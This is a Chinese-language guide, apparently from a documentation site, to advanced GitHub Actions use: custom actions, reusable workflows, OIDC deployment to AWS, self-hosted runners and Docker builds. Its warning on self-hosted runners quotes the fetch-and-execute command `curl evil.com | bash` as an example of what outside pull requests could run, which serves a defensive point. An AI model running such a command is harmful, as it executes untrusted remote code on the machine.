---
layout: doc
outline: [2, 3]
---

# 指南 - 高级

> 自定义 Action / Reusable Workflows / OIDC / 自托管 Runner / Docker 构建

## 速查

- 自定义 Action 三类：JavaScript（最快 + 跨平台）/ Composite（最简单，多 step 打包）/ Docker（最隔离 + 仅 Linux）
- Composite Action：`runs.using: composite` + `steps:`，比 Reusable Workflow 轻量
- Reusable Workflow：`on.workflow_call`，整个 workflow 当函数调；可传 inputs / secrets / 拿 outputs
- OIDC：`permissions.id-token: write` + cloud 端配 IAM 联邦；替代长期密钥
- Self-hosted Runner：`runs-on: [self-hosted, linux, x64]`，私有 / 内网 / 高性能场景
- Docker 镜像：用 `docker/build-push-action@v6` 配 BuildKit 缓存最快

## 自定义 Action 三类

放仓库 `.github/actions/<name>/action.yml` 即本地 Action，调用时 `uses: ./.github/actions/<name>`。开源给别人用就单独放个仓库，按 commit SHA 引用。

### 1. Composite Action（最简单 + 最常用）

打包多个 `run` 步骤 + `uses` 别人的 Action：

```yaml
# .github/actions/setup-pnpm/action.yml
name: 'Setup pnpm + Node'
description: '安装 pnpm + Node + 依赖'
inputs:
  node-version:
    required: true
    default: '22'
  install-args:
    default: '--frozen-lockfile'
outputs:
  cache-hit:
    value: ${{ steps.setup-node.outputs.cache-hit }}
runs:
  using: 'composite'
  steps:
    - uses: pnpm/action-setup@v4
      with:
        version: 9
    - uses: actions/setup-node@v4
      id: setup-node
      with:
        node-version: ${{ inputs.node-version }}
        cache: 'pnpm'
    - run: pnpm install ${{ inputs.install-args }}
      shell: bash                       # composite 里的 run **必填** shell
```

调用：

```yaml
- uses: ./.github/actions/setup-pnpm
  with:
    node-version: '22'
```

::: warning Composite Action 里 `run:` 必填 `shell:`

不同于普通 workflow（默认 bash），Composite Action 的 `run:` step 必须显式写 `shell:`，否则解析失败。

:::

### 2. JavaScript Action（跨平台 + 速度快）

```yaml
# action.yml
name: 'PR Slack Notifier'
description: 'Send PR info to Slack'
inputs:
  slack-webhook:
    required: true
runs:
  using: 'node20'                       # 使用 Node 20 运行时
  main: 'dist/index.js'                 # 编译后入口
```

```js
// src/index.js
const core = require('@actions/core');
const github = require('@actions/github');

(async () => {
  try {
    const webhook = core.getInput('slack-webhook');
    const pr = github.context.payload.pull_request;
    await fetch(webhook, {
      method: 'POST',
      body: JSON.stringify({ text: `New PR: ${pr.title}` }),
    });
    core.setOutput('status', 'sent');
  } catch (err) {
    core.setFailed(err.message);
  }
})();
```

需用 `@vercel/ncc` 把依赖打到 `dist/index.js`（GitHub 不会 `npm install`）。适合：需要调 GitHub API / 跨平台运行 / 性能敏感。

### 3. Docker Container Action

```yaml
# action.yml
name: 'Custom Linter'
runs:
  using: 'docker'
  image: 'docker://ghcr.io/myorg/custom-linter:v1.0'
  args:
    - ${{ inputs.path }}
```

或就地构建：

```yaml
runs:
  using: 'docker'
  image: 'Dockerfile'                   # 同目录的 Dockerfile
```

**限制**：只能在 Linux runner 上跑，启动慢（要拉 / 起 container）。适合：依赖大量 native lib / 想锁定完整环境。

## Composite Action vs Reusable Workflow

| 维度       | Composite Action       | Reusable Workflow              |
| ---------- | ---------------------- | ------------------------------ |
| 粒度       | step 级（多 step 包成 1 step） | 整个 workflow（多 job）        |
| 调用方式   | `uses:` 在 steps 里     | `uses:` 在 jobs 里             |
| Matrix 支持 | 调用方自由             | 整体也能 matrix                 |
| 可访问的 context | secrets / inputs / outputs | inputs / secrets / outputs（要 `value:` 映射） |
| 内嵌别的 Action | ✅                     | ✅                              |
| 嵌套深度   | 无明显上限             | 9 层（10 个 workflow）          |

**经验**：

- 想统一一组 step（"安装依赖 + 跑 lint"）→ **Composite Action**
- 想统一一整套流水线（"测试 + 构建 + 发布"）→ **Reusable Workflow**

## Reusable Workflows

### 定义

```yaml
# .github/workflows/deploy.yml （被调）
name: Reusable Deploy

on:
  workflow_call:
    inputs:
      environment:
        type: string
        required: true
      version:
        type: string
        default: 'latest'
    secrets:
      aws-role:
        required: true
    outputs:
      deployment-url:
        description: '部署 URL'
        value: ${{ jobs.deploy.outputs.url }}

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    outputs:
      url: ${{ steps.do.outputs.url }}
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: ${{ secrets.aws-role }}
          aws-region: ap-southeast-1
      - id: do
        run: |
          ./deploy.sh ${{ inputs.environment }} ${{ inputs.version }}
          echo "url=https://${{ inputs.environment }}.example.com" >> $GITHUB_OUTPUT
```

### 调用

```yaml
# .github/workflows/release.yml （调用方）
name: Release

on:
  push:
    tags: ['v*']

jobs:
  deploy-staging:
    uses: ./.github/workflows/deploy.yml           # 同仓库
    with:
      environment: staging
      version: ${{ github.ref_name }}
    secrets:
      aws-role: ${{ secrets.AWS_STAGING_ROLE }}

  deploy-prod:
    needs: deploy-staging
    uses: myorg/shared-workflows/.github/workflows/deploy.yml@v1.0.0   # 跨仓库
    with:
      environment: production
      version: ${{ github.ref_name }}
    secrets: inherit                              # 把当前 workflow 的全部 secrets 透传
```

### 限制要点

- 最多嵌套 9 层 reusable workflow
- secrets 不会自动传递——要么写 <span v-pre>`secrets: <name>: ${{ secrets.X }}`</span>，要么 `secrets: inherit`
- 调用方的 outputs 取法：`needs.<job-id>.outputs.<name>`
- 同仓库 reusable workflow 调用必须用 `./.github/workflows/x.yml`（不能省 `./`）

## OIDC 部署：替代长期密钥

最大杀手锏。以 AWS 为例：

### 1. AWS 端配 IAM

```bash
# 创建 OIDC Provider
aws iam create-open-id-connect-provider \
  --url https://token.actions.githubusercontent.com \
  --client-id-list sts.amazonaws.com \
  --thumbprint-list 6938fd4d98bab03faadb97b34396831e3780aea1
```

创建 IAM Role，Trust Policy：

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "Federated": "arn:aws:iam::123456789:oidc-provider/token.actions.githubusercontent.com"
    },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
      },
      "StringLike": {
        "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:*"
      }
    }
  }]
}
```

`sub` 条件控制谁能 assume 这个 Role：

| `sub` 值                                          | 含义                          |
| ------------------------------------------------- | ----------------------------- |
| `repo:org/repo:*`                                 | 该仓库所有触发                |
| `repo:org/repo:ref:refs/heads/main`               | 只允许 main 分支              |
| `repo:org/repo:environment:production`            | 只在 production environment 下 |
| `repo:org/repo:pull_request`                      | 只在 PR 触发时                |

### 2. Workflow 端用 OIDC

```yaml
name: Deploy

on:
  push:
    branches: [main]

permissions:
  id-token: write                       # OIDC 必备
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@v4

      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: arn:aws:iam::123456789:role/github-actions-prod
          aws-region: ap-southeast-1
          # 不需要 access key / secret access key！

      - run: aws sts get-caller-identity         # 验证身份
      - run: aws s3 sync dist/ s3://my-bucket/
```

**优点**：

- 无长期密钥泄露风险
- 短期 token（默认 1 小时）
- 可按 environment / branch / event_name 细粒度限制

类似的 Action：

- Azure: `azure/login@v2`
- GCP: `google-github-actions/auth@v2`
- Vault: `hashicorp/vault-action@v3`
- HashiCorp Cloud: `hashicorp/setup-hcp-cli@v1`

## 自托管 Runner

### 安装（Linux）

仓库 / 组织 Settings → Actions → Runners → New self-hosted runner，按页面给的命令跑：

```bash
# 在你的机器上
mkdir actions-runner && cd actions-runner
curl -o actions-runner-linux-x64-2.319.0.tar.gz \
  -L https://github.com/actions/runner/releases/download/v2.319.0/actions-runner-linux-x64-2.319.0.tar.gz
tar xzf ./actions-runner-linux-x64-2.319.0.tar.gz

# 配置（用 UI 给的 token）
./config.sh --url https://github.com/myorg/myrepo --token AAAAA...

# 跑（前台）
./run.sh

# 装成 service（推荐）
sudo ./svc.sh install
sudo ./svc.sh start
```

### 调度

```yaml
jobs:
  build:
    runs-on: [self-hosted, linux, x64, gpu]   # 多标签**全匹配**才调度
```

把 Runner 注册时加几个 label（如 `gpu`、`internal`），就能精确把任务调度过去。

### 与 GitHub-hosted Runner 比

| 维度        | GitHub-hosted        | Self-hosted              |
| ----------- | -------------------- | ------------------------ |
| 运维        | 零                   | 自己装 + 升级 + 监控     |
| 性能        | 2 vCPU / 7 GB（默认） | 你的机器有多硬就多硬     |
| 网络        | 公网                 | 可访问内网 / 私有 registry |
| 安全        | 每次 job 全新环境    | 默认共享，需自己加防护   |
| 配额        | 每月 minute 限额     | 不计入 GitHub minute     |
| 适合        | 个人 / 中小项目       | 大量构建 / 内网 / GPU / 合规 |

### 安全注意

自托管 Runner **默认不应跑 fork PR**：

仓库 Settings → Actions → Fork pull request workflows → 选 "Require approval for all outside collaborators"，否则任意人 PR 都能在你的机器上跑 `curl evil.com | bash`。

## Docker 镜像构建

GitHub 推荐 `docker/build-push-action@v6`，自带 BuildKit + 缓存：

```yaml
name: Build Image

on:
  push:
    branches: [main]
    tags: ['v*']

permissions:
  contents: read
  packages: write                       # push 到 GHCR 必备

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: docker/setup-buildx-action@v3   # 启用 BuildKit
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}   # 自动注入，无需配

      - id: meta
        uses: docker/metadata-action@v5
        with:
          images: ghcr.io/${{ github.repository }}
          tags: |
            type=raw,value=latest,enable={{is_default_branch}}
            type=semver,pattern={{version}}
            type=sha,format=short

      - uses: docker/build-push-action@v6
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha            # 复用 GHA 缓存（跨 workflow 也行）
          cache-to: type=gha,mode=max
          platforms: linux/amd64,linux/arm64    # 多架构
```

要点：

- **不需要 DinD**：GHA Runner 默认有 Docker daemon
- **GITHUB_TOKEN** 自动注入，零配置 push 到 GHCR
- **cache-from/to: type=gha** 用 GHA 缓存替代 registry 缓存，跨 workflow 复用
- 多架构靠 `docker/setup-qemu-action@v3` 启用 QEMU + buildx multi-platform

## 完整生产流：测试 + 构建 + OIDC 部署

```yaml
name: CI/CD

on:
  push:
    branches: [main]
    tags: ['v*']
  pull_request:

permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}
  cancel-in-progress: true

jobs:
  test:
    uses: ./.github/workflows/reusable-test.yml

  build:
    needs: test
    if: github.event_name == 'push'
    runs-on: ubuntu-latest
    permissions:
      packages: write
    outputs:
      image: ${{ steps.meta.outputs.tags }}
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - id: meta
        uses: docker/metadata-action@v5
        with:
          images: ghcr.io/${{ github.repository }}
          tags: |
            type=raw,value=latest,enable={{is_default_branch}}
            type=semver,pattern={{version}}
            type=sha,format=short,prefix=
      - uses: docker/build-push-action@v6
        with:
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

  deploy:
    needs: build
    if: startsWith(github.ref, 'refs/tags/v')
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://app.example.com
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: ${{ secrets.AWS_PROD_ROLE }}
          aws-region: ap-southeast-1
      - run: |
          aws ecs update-service \
            --cluster prod \
            --service web \
            --force-new-deployment
```
